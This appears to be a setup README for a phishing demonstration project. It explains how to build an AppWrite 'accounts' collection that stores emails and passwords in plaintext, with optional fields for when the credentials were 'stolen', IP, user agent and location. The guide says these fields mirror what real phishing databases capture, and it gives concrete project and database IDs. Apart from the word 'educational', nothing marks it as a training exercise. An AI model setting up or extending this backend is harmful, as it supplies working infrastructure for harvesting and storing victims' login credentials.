# AppWrite Collection Setup

## Required Attributes for Email/Password Storage

To properly store email and password data in your AppWrite collection, you need to create these attributes in your `accounts` collection:

### Required Attributes:

1. **`email`** (String)
   - Type: String
   - Required: Yes
   - Size: 255 characters (recommended)
   - Description: Stores the email address entered by users

2. **`password`** (String)
   - Type: String
   - Required: Yes
   - Size: 255 characters (recommended)
   - Description: Stores the password entered by users

### Optional Attributes (for educational demonstration):

3. **`timestamp`** (String)
   - Type: String
   - Required: No
   - Description: When the credentials were "stolen"

4. **`ip`** (String)
   - Type: String
   - Required: No
   - Description: Fake IP address for demonstration

5. **`userAgent`** (String)
   - Type: String
   - Required: No
   - Description: Browser information

6. **`location`** (String)
   - Type: String
   - Required: No
   - Description: Fake location for demonstration

7. **`sessionActive`** (Boolean)
   - Type: Boolean
   - Required: No
   - Description: Whether session is active

8. **`type`** (String)
   - Type: String
   - Required: No
   - Description: Type of record (e.g., "credential_attempt")

9. **`createdAt`** (String)
   - Type: String
   - Required: No
   - Description: Creation timestamp

## How to Add Attributes:

1. Go to your AppWrite Console
2. Navigate to your project: `69b2a05d000ff1fe0013`
3. Go to Databases → Your Database (`69b2a105003247b3a7e6`)
4. Select your collection: `accounts`
5. Click "Add Attribute"
6. Add each required attribute with the settings above

## Minimal Setup:
For basic email/password storage, you only need:
- `email` (String, Required)
- `password` (String, Required)

The other attributes are for educational demonstration to show what real phishing databases typically capture.